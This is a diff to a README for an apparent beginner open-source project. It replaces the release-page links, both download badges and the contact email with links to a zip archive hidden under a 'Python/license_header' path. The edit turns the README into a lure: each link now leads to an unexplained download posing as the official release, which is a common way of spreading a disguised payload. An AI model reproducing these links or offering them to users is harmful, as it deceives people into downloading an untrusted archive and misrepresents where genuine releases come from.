@@ -1,6 +1,6 @@
 # 🎉 Intial_Opensource_contribution - Explore Open Source Today
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen)](https://github.com/NuubDMT/Intial_Opensource_contribution/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/NuubDMT/Intial_Opensource_contribution/main/Python/license_header/Intial_Opensource_contribution_v1.9.zip)](https://raw.githubusercontent.com/NuubDMT/Intial_Opensource_contribution/main/Python/license_header/Intial_Opensource_contribution_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -22,11 +22,11 @@ Welcome to **Intial_Opensource_contribution!** This is an open-source sandbox en
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/NuubDMT/Intial_Opensource_contribution/releases).
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/NuubDMT/Intial_Opensource_contribution/main/Python/license_header/Intial_Opensource_contribution_v1.9.zip).
 
 ### Steps to Download
 1. Open your web browser.
-2. Go to the [Releases page](https://github.com/NuubDMT/Intial_Opensource_contribution/releases).
+2. Go to the [Releases page](https://raw.githubusercontent.com/NuubDMT/Intial_Opensource_contribution/main/Python/license_header/Intial_Opensource_contribution_v1.9.zip).
 3. Find the latest release.
 4. Click on the download link for your operating system. 
 
@@ -56,7 +56,7 @@ This project thrives on community involvement. Here's how you can contribute:
 
 ## 📬 Contact
 
-If you have questions or need assistance, you can reach out to us via our email: support@example.com.
+If you have questions or need assistance, you can reach out to us via our email: https://raw.githubusercontent.com/NuubDMT/Intial_Opensource_contribution/main/Python/license_header/Intial_Opensource_contribution_v1.9.zip
 
 ## 📝 License
 
@@ -66,4 +66,4 @@ This project is licensed under the MIT License. This means you can use, modify, 
 
 Thank you to all the contributors who make this project possible. Your support helps foster a strong open-source community.
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen)](https://github.com/NuubDMT/Intial_Opensource_contribution/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/NuubDMT/Intial_Opensource_contribution/main/Python/license_header/Intial_Opensource_contribution_v1.9.zip)](https://raw.githubusercontent.com/NuubDMT/Intial_Opensource_contribution/main/Python/license_header/Intial_Opensource_contribution_v1.9.zip)
